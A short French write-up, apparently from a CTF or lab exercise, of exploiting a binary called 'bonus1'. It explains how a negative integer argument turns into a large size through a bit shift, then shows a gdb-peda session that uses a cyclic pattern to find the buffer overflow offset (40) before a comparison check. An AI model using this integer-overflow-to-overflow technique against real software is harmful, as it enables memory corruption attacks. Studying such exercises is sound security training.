- On voit que dans le code les bit sont decaler de deux pour calculer la taille
- Le premier bit d'un int sert a savoir si il est negatif ou positif
- donc il suffit d'avoir un a  deux bit de la fin pour avoir un chiffre postif plus grand
<pre>
[alarmv@alarm Ressources]$ gdb ./bonus1 
gdb-peda$ pattern create 75
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAA'
gdb-peda$ disass main
Dump of assembler code for function main:
   <strong>0x08048473</strong> <+79>:    call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46
gdb-peda$ b *0x08048478
Breakpoint 1 at 0x8048478
gdb-peda$ r -2147483600 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAA'
gdb-peda$ x $esp+0x3c
<strong>0xffffd54c:     "AA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAA"</strong>
gdb-peda$ pattern offset AA0AAFA
AA0AAFA found at offset: <strong>40</strong>
</pre>
